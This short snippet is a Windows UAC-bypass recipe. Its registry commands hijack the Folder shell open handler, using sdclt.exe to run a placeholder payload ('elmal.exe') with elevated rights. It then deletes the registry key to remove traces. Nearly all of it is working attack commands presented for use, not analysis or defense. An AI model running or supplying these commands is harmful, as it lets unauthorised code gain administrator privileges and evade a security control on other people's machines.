**Simple and effective UAC bypass**
```
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c elmal.exe" /f
reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f
```
Execute:
```
%windir%\system32\sdclt.exe
```

Delete after play:
```
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f
```
